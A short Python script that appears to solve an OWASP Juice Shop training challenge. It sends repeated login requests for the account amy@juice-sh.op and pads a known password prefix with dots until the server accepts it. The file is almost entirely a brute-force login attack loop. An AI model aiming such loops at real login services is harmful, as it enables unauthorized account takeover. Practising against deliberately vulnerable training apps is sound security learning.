import requests


password = "K1f"
for x in range(30):
	r = requests.post("https://juice-shop.herokuapp.com/rest/user/login", data={"email":"amy@juice-sh.op","password":password})
	password += "."
	print ("Pass: ", password, "Status code: ", r.status_code)
	if r.status_code == 200:
		print ("Found")
		break

